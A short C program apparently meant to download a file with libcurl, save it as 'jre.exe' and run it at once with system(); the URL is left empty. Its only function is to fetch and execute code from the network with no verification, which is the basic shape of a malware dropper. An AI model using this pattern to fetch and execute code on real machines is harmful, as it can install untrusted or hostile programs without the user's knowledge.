#include <stdio.h>
#include <curl/curl.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t w = fwrite(ptr, size, nmemb, stream);
    return w;
}

int main(void) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char *url = "";
    char outfilename[FILENAME_MAX] = "jre.exe";

    curl = curl_easy_init();

    if (curl) {
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);

        system("jre.exe");
    }
    return 0;
}
